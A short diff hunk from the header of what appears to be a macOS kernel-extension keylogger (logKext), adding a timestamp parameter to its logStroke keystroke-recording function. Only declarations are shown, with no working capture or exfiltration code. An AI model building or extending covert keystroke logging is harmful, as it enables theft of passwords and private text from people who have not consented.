@@ -75,7 +75,7 @@ class com_fsb_iokit_logKext : public IOService
 		IOReturn BuffandKeys(UInt32* size,UInt32* keys);
 		IOReturn Buffer(bufferStruct* inStruct);
 		
-		void logStroke( unsigned key, unsigned flags, unsigned charCode );
+		void logStroke( unsigned key, unsigned flags, unsigned charCode, AbsoluteTime ts );
 };
 
 
